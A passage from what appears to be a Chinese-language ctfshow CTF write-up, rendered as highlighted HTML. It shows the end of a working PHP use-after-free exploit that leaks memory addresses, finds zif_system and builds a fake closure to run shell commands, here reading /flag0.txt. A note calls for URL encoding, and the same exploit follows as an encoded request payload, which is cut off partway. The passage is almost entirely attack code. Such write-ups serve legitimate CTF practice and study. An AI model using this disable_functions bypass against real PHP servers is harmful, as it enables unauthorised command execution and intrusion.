invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br> <br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br> <br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br> <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br> <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br> <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br> <br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br> <br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br> <br> <br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br> <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br> <br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br> <br><span class="hljs-title function_ invoke__">ctfshow</span>(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>需要url编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">66</span>%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">77</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">64</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">56</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">75</span>%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">75</span>%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">5</span>f%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">75</span>%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">74</span>%<span class="hljs-number">68</span>%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">3</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">65</span>%<span class="hljs-number">77</span>%<span class="hljs-number">20</span>%<span class="hljs-number">45</span>%<span class="hljs-number">78</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">29</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">3</span>e%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">54</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">31</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">5</span>b%<span class="hljs-number">27</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">73</span>%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>%<span class="hljs-number">67</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">48</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">75</span>%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">32</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">26</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">31</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">2</span>d%<span class="hljs-number">2</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">3</span>c%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">64</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">32</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span 